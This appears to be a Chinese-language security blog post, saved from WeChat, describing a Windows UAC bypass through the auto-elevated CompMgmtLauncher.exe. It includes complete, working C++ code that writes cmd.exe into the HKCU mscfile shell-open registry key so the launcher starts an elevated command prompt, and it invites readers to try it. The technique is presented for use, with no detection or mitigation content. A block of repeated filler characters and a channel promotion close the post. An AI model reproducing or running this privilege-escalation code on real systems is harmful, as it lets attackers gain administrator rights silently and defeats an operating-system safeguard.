> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5Vlg6XsPMZx_xx7THBTBvQ)

前言

    **有些系统程序在运行时，是不会触发 UAC 的，这类程序都为 "白名单" 程序，而我们就可以使用这类程序来进行 Bypass UAC**  

1.

    当 **CompMgmtLauncher.exe** 该程序启动时，会查询注册表 **Software\\classes\\mscfile\\shell\\open\\command** 的内容，并执行。

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyy7I7mM2qdgISUA0qQC7zhHXBqNstsiaG3YynDZcic0PFZLvhlwpPMiaORx6eptY4bonibF1nJAmef9qQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyy7I7mM2qdgISUA0qQC7zhHgMFUskB3jNqeFMg5R5ojhI37I1G9QAEpeiaAS5rsGpTo0lEWOfNNI2Q/640?wx_fmt=png)

2.

    代码实现如下：通过改写注册表即可完成  

```
#include "stdafx.h"
#include <windows.h>
#include <iostream>
using namespace std;

void bypass(){
  HKEY key;
  LPCSTR lpszFileName = "C:\\Windows\\System32\\cmd.exe";
  RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\classes\\mscfile\\shell\\open\\command",0,NULL,0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &key, NULL);
  if(key == NULL){
    cout <<"Error" <<endl;
  }
  if(RegSetValueExA(key,NULL,0,(DWORD)REG_SZ,(BYTE*)lpszFileName,strlen(lpszFileName)+1)!= ERROR_SUCCESS){
    cout <<"Error" << endl;
      
    }
  RegCloseKey(key);
  
}


int _tmain(int argc, _TCHAR* argv[])
{
bypass();
getchar();
  return 0;
}
```

3.

    在运行一下 **CompMgmtLauncher.exe** 看一下，发现已经成功运行 **cmd** 程序

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWyy7I7mM2qdgISUA0qQC7zhHsEicS5jencQpNsFOiaJ4EcxtgXGMiaqq5EadNonXg84jdy1er66iaT8TIg/640?wx_fmt=png)

4.

    本文章通过很简单的方法即可 Bypass UAC，具体线下可自行尝试。

凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字凑字

 **微信搜索关注 "安全族" 长期更新安全资料，扫一扫即可关注安全族！**

![](https://mmbiz.qpic.cn/mmbiz_jpg/8miblt1VEWywCsRiaweFhRW8aDdjtoCoSU2eQAJ6KxKAoP0PSHvjGJvTZcRRXTAeSd9Qyib0ynLnBUwdiahhhOaSDQ/640?wx_fmt=jpeg)